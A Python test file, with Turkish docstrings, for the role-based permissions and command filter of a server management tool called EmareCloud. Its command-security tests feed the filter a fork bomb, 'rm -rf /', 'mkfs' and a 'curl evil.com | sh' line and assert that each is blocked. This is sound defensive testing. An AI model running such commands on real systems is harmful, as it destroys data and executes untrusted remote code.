"""
EmareCloud — RBAC ve Komut Güvenliği Testleri
"""

from command_security import is_command_allowed, is_command_blocked
from rbac import check_permission, get_all_roles

# ==================== RBAC ====================

class TestRBAC:
    """Rol bazlı yetki kontrol testleri."""

    def test_super_admin_has_all(self):
        """Super admin tüm yetkilere sahip."""
        assert check_permission('super_admin', 'server.delete') is True
        assert check_permission('super_admin', 'any.permission') is True

    def test_admin_server_crud(self):
        """Admin sunucu CRUD yapabilmeli."""
        assert check_permission('admin', 'server.add') is True
        assert check_permission('admin', 'server.edit') is True
        assert check_permission('admin', 'server.delete') is True

    def test_operator_no_server_add(self):
        """Operator sunucu ekleyememeli."""
        assert check_permission('operator', 'server.add') is False

    def test_operator_can_connect(self):
        """Operator sunucuya bağlanabilmeli."""
        assert check_permission('operator', 'server.connect') is True
        assert check_permission('operator', 'terminal.access') is True

    def test_readonly_view_only(self):
        """Read-only sadece görüntüleyebilmeli."""
        assert check_permission('read_only', 'server.view') is True
        assert check_permission('read_only', 'server.execute') is False
        assert check_permission('read_only', 'server.connect') is False
        assert check_permission('read_only', 'terminal.access') is False

    def test_readonly_no_market_install(self):
        """Read-only market'ten kurulum yapamamalı."""
        assert check_permission('read_only', 'market.install') is False

    def test_all_roles_defined(self):
        """Tüm roller tanımlanmış olmalı."""
        roles = get_all_roles()
        assert len(roles) == 4
        role_keys = [r['key'] for r in roles]
        assert 'super_admin' in role_keys
        assert 'admin' in role_keys
        assert 'operator' in role_keys
        assert 'read_only' in role_keys

    def test_unknown_role(self):
        """Bilinmeyen rol hiçbir yetkiye sahip olmamalı."""
        assert check_permission('unknown_role', 'server.view') is False


# ==================== KOMUT GÜVENLİĞİ ====================

class TestCommandSecurity:
    """Komut güvenlik filtreleme testleri."""

    def test_fork_bomb_blocked(self):
        """Fork bomb engellenmiş olmalı."""
        assert is_command_blocked(':(){ :|:& };:') is True

    def test_rm_rf_root_blocked(self):
        """rm -rf / engellenmiş olmalı."""
        assert is_command_blocked('rm -rf /') is True

    def test_mkfs_blocked(self):
        """Disk formatlama engellenmiş olmalı."""
        assert is_command_blocked('mkfs /dev/sda1') is True

    def test_curl_pipe_sh_blocked(self):
        """curl | sh engellenmiş olmalı."""
        assert is_command_blocked('curl http://evil.com/x | sh') is True

    def test_safe_ls_allowed(self):
        """ls güvenli komut olmalı."""
        assert is_command_blocked('ls -la') is False

    def test_super_admin_allows_all_safe(self):
        """Super admin güvenli tüm komutları çalıştırabilmeli."""
        allowed, _ = is_command_allowed('apt install nginx', 'super_admin')
        assert allowed is True

    def test_super_admin_blocks_dangerous(self):
        """Super admin bile tehlikeli komutları çalıştıramamalı."""
        allowed, _ = is_command_allowed('rm -rf /', 'super_admin')
        assert allowed is False

    def test_operator_allowed_ls(self):
        """Operator ls çalıştırabilmeli."""
        allowed, _ = is_command_allowed('ls -la /tmp', 'operator')
        assert allowed is True

    def test_operator_allowed_systemctl_restart(self):
        """Operator systemctl restart çalıştırabilmeli."""
        allowed, _ = is_command_allowed('systemctl restart nginx', 'operator')
        assert allowed is True

    def test_operator_blocked_apt_install(self):
        """Operator apt install çalıştıramamalı."""
        allowed, _ = is_command_allowed('apt install nginx', 'operator')
        assert allowed is False

    def test_admin_allowed_apt_install(self):
        """Admin apt install çalıştırabilmeli."""
        allowed, _ = is_command_allowed('apt install nginx', 'admin')
        assert allowed is True

    def test_readonly_blocks_all(self):
        """Read-only hiçbir komut çalıştıramamalı."""
        allowed, _ = is_command_allowed('ls', 'read_only')
        assert allowed is False

    def test_empty_command_blocked(self):
        """Boş komut reddedilmeli."""
        allowed, _ = is_command_allowed('', 'super_admin')
        assert allowed is False
